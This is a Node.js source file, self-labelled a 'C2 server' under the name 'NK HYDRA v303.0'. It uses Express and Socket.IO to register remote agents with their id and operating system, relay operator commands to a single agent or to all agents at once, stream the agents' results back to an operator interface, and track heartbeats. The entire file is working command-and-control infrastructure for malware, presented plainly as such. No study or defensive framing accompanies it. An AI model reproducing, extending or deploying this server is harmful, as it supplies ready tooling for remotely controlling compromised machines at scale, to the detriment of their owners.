 // TYPE: NODE.JS C2 SERVER
// NK HYDRA v303.0 [TITAN STABLE]

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => { res.json({ status: 'NK_HYDRA_ONLINE', version: 'v303.0', agents: agents.length }); });

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingInterval: 10000, 
    pingTimeout: 60000, // Generous timeout for slow scans
    maxHttpBufferSize: 1e8 // 100MB buffer for logs
});

let agents = []; 

io.on('connection', (socket) => {
    // console.log('[+] New Connection:', socket.id);

    // Identify Phase
    socket.on('identify', (data) => {
        if (data.type === 'ui') {
            socket.join('ui_room');
            socket.emit('agents_list', agents);
            return;
        }
        
        // Register Agent
        const existingIdx = agents.findIndex(a => a.id === data.id);
        const agentData = { ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() };
        
        if (existingIdx >= 0) {
            agents[existingIdx] = agentData;
        } else {
            agents.push(agentData);
        }
        
        console.log(`[+] Agent Registered: ${data.id} (${data.os})`);
        io.to('ui_room').emit('agents_list', agents);
    });

    // Command Relay (UI -> Agent)
    socket.on('exec_cmd', (data) => {
        console.log(`[>] CMD: ${data.cmd} -> ${data.targetId}`);
        if (data.targetId === 'all') {
            socket.broadcast.emit('exec_cmd', data); // Broadcast to all agents
        } else {
            const agent = agents.find(a => a.id === data.targetId);
            if (agent) io.to(agent.socketId).emit('exec_cmd', data);
        }
    });
    
    // Event Relay (Agent -> UI)
    socket.on('agent_event', (data) => {
        // Relay Log immediately to UI
        io.to('ui_room').emit('agent_event', data);
        
        // Log locally for debug
        if (data.type === 'SUCCESS' || data.type === 'ERROR') {
            console.log(`[<] ${data.type} from ${data.agentId}`);
        }
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            agent.status = 'Offline'; 
            console.log(`[-] Agent Lost: ${agent.id}`);
            io.to('ui_room').emit('agents_list', agents);
        }
    });
    
    socket.on('heartbeat', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) {
            agent.lastSeen = Date.now();
            agent.status = 'Online';
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v303.0 LISTENING ON ${PORT}`));
